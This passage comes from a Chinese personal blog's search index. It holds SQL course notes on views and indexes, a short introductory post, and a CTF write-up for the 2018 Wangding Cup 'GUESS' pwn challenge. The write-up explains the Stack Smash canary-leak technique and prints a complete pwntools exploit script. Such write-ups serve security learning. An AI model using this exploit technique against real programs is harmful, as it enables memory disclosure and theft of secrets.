href="#行列子集视图" class="headerlink" title="行列子集视图"></a>行列子集视图</h4><p>从单个基本表导出，并且只是去掉了基本表的某些行和某些列，但保留了主码</p><p>eg：建立信息系学生的视图，要求进行修改和插入操作时仍需保证该视图只有信息系的学生</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept=<span class="string">'IS'</span></span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">CHECK</span> <span class="keyword">OPTION</span></span><br></pre></td></tr></table></figure><h4 id="基于多个基表的视图"><a href="#基于多个基表的视图" class="headerlink" title="基于多个基表的视图"></a>基于多个基表的视图</h4><p>eg：建立信息系选修了1号课程的学生的视图(包括学号、姓名、成绩)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_S1(Sno,Sname,Grade)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student,SC</span><br><span class="line"><span class="keyword">WHERE</span> Sdept=<span class="string">'IS'</span> <span class="keyword">AND</span> Student.Sno=SC.Sno <span class="keyword">AND</span> SC.Cno=<span class="string">'1'</span>;</span><br></pre></td></tr></table></figure><h4 id="基于视图的视图"><a href="#基于视图的视图" class="headerlink" title="基于视图的视图"></a>基于视图的视图</h4><p>eg：建立信息系选修了1号课程且成绩在90分以上的学生的视图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_S2</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Grade</span><br><span class="line"><span class="keyword">FROM</span> IS_S1</span><br><span class="line"><span class="keyword">WHERE</span> Grade&gt;=<span class="number">90</span></span><br></pre></td></tr></table></figure><h4 id="带表达式的视图"><a href="#带表达式的视图" class="headerlink" title="带表达式的视图"></a>带表达式的视图</h4><p>eg：定义一个反映学生<strong>出生年份</strong>的视图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> BT_S(Sno,Sname,Sbirth)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,<span class="number">2014</span>-Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure><h4 id="分组视图"><a href="#分组视图" class="headerlink" title="分组视图"></a>分组视图</h4><p>eg：将学生的学号及平均成绩定义为一个视图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> S_G(Sno,Gavg)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="keyword">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno;</span><br></pre></td></tr></table></figure><h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h3><p>eg：删除视图BT_S和IS_S1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> BT_S;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> IS_S1;</span><br></pre></td></tr></table></figure><p>(实践中删除IS_S1不需要使用级联删除)</p><p>删除IS_S1后打开IS_S2会报错</p><h3 id="查询视图"><a href="#查询视图" class="headerlink" title="查询视图"></a>查询视图</h3><p>eg：在信息系学生的视图中找出年龄小于20岁的学生</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sage</span><br><span class="line"><span class="keyword">FROM</span> Is_Student </span><br><span class="line"><span class="keyword">WHERE</span> Sage&lt;<span class="number">20</span>;</span><br></pre></td></tr></table></figure><h3 id="更新视图"><a href="#更新视图" class="headerlink" title="更新视图"></a>更新视图</h3><p>与前面对表的操作类似，但是需要注意仅有行列子集视图更新后能方便的转化为对基本表的更新</p><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p>eg：向信息系学生视图IS_S中插入一个新的学生记录，其中学号为”201215129”，姓名为”赵新”，年龄为20岁</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> IS_Student</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">'201215129'</span>,<span class="string">'赵新'</span>,<span class="number">20</span>);</span><br></pre></td></tr></table></figure><p>（操作中出现了2013报错的蜜汁bug，晚上事情太多，下次遇到再解决吧</p><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>eg：删除信息系学生视图IS_Student中学号为”201215129”的记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">FROM</span> IS_Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno=<span class="string">'201215129'</span></span><br></pre></td></tr></table></figure><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>建立索引的目的：加快查询速度</p><h3 id="建立索引"><a href="#建立索引" class="headerlink" title="建立索引"></a>建立索引</h3><p>eg：Course表按课程号升序建唯一索引</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> Coucno <span class="keyword">ON</span> Course(Cno);</span><br></pre></td></tr></table></figure><h3 id="修改与删除索引"><a href="#修改与删除索引" class="headerlink" title="修改与删除索引"></a>修改与删除索引</h3><p>eg：将Course表的Coucno索引名改为CCno</p><p>尝试教材上的sql语句失败，猜测是环境原因，但是并未在网络上找到对应的解决方案</p>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018-pwn-GUESS-StackSmash</title>
      <link href="2020/04/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-pwn-GUESS-StackSmash/"/>
      <url>2020/04/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-pwn-GUESS-StackSmash/</url>
      
        <content type="html"><![CDATA[<h1 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h1><p>题目链接：<a href="https://github.com/0bs3rver/chellenge/blob/master/2018网鼎杯/GUESS" target="_blank" rel="noopener">GUESS</a></p><h2 id="查看题目"><a href="#查看题目" class="headerlink" title="查看题目"></a>查看题目</h2><p>首先checksec查看保护</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master/blogimg/%E7%BD%91%E9%BC%8E2018-pwn-guess1.png"  alt=""></p><p>然后扔进ida查看源码</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master/blogimg/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-pwn-guess2.png"  alt=""></p><h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>很明显的一个栈溢出漏洞，但是打开了canary，在反汇编代码可以看到在 main 函数结束时检查了 canary 的值，与 rcx 进行比较， canary 的值是放在 fs 寄存器中的，理论上我们是不能正常查看的，且只有三次溢出机会，没办法爆破出canary，加上flag在栈上以及未开启PIE保护，想到了Stack Smash</p><p>在程序加了canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，会执行 __stack_chk_fail 函数来打印出 argv[0] 指针所指向的字符串，而Stack Smash技巧则就是利用打印这一信息的程序来得到我们想要的内容</p><p>argv[0] 一般指向的是程序名</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>总思路为先找到argv[0] 指针地址，然后打印出函数实际地址，从而减去函数偏移的到libc基址，然后打印environ 变量的值（environ 变量作为一个指针指向了环境变量的字符指针数组的首地址，可以简单的理解为environ 变量的实际地址是指向栈的基地址（高地址）），从而得到栈基址，然后在计算flag与栈基址的偏移从而打印出flag</p><h3 id="泄漏函数实际地址"><a href="#泄漏函数实际地址" class="headerlink" title="泄漏函数实际地址"></a>泄漏函数实际地址</h3><p>首先使用gdb进行调试，计算出输入的字符串与argv[0]之间的偏移</p><p>在gets函数处打下断点，执行过去输入”aaa”后查看栈空间</p><p><img src="/" class="lazyload" data-src="https://raw.githubusercontent.com/0bs3rver/Picture/master/blogimg/%E7%BD%91%E9%BC%8E2018-pwn-guess3.png"  alt=""></p><p>可得argv[0] 指针为0x7fffffffde58，与输入字符串所在处0x7fffffffdd30的偏移为0x128</p><p>于是得到第一步payload = ‘a’*0x128 + p64(libc_start_main_got)</p><h3 id="得到栈基址"><a href="#得到栈基址" class="headerlink" title="得到栈基址"></a>得到栈基址</h3><p>计算出libc基址后，只需打印environ 变量的值即可得到栈基址</p><p>所以得到第二步payload = ‘a’*0x128 + p64(environ_addr)</p><h3 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h3><p>与前两步同样的思路，只需要计算flag的偏移即可</p><p>我们可以通过在gdb里面为environ 变量下断点获得栈基址</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master/blogimg/%E7%BD%91%E9%BC%8E2018-pwn-guess4.png"  alt=""></p><p>然后计算偏移（这里我为了调试新建了一个测试的flag.txt）</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master/blogimg/%E7%BD%91%E9%BC%8E2018-pwn-guess3.png"  alt=""></p><p>可得偏移为0x168</p><p>所以第三步payload = ‘a’*0x128 + p64(stack_addr - 0x168)</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>最后的EXP为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"./GUESS"</span>)</span><br><span class="line"><span class="comment">#p = remote('', '')</span></span><br><span class="line">p = process(<span class="string">"./GUESS"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x602048</span></span><br><span class="line">libc_start_main_off = libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x128</span> + p64(libc_start_main_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">libc_start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_base_addr = libc_start_main_addr - libc_start_main_off</span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">'_environ'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
            <tag> 网鼎 </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thefirst</title>
      <link href="2020/04/08/thefirst/"/>
      <url>2020/04/08/thefirst/</url>
      
        <content type="html"><![CDATA[<h1 id="第一篇文章-P"><a href="#第一篇文章-P" class="headerlink" title="第一篇文章 : P"></a>第一篇文章 : P</h1><p>之前一直偷懒把东西扔在csdn，方便自己看就完事了</p><p>现在发现还是得整个自己的博客，慢慢往里面放一点东西也有和MC里边建家一样的快乐</p><p>目前是一只二进制小菜鸡</p><p>以后会更新一些学到的东西，算是督促一下懒散的自己</p><p>今天不学习，明天变垃圾</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
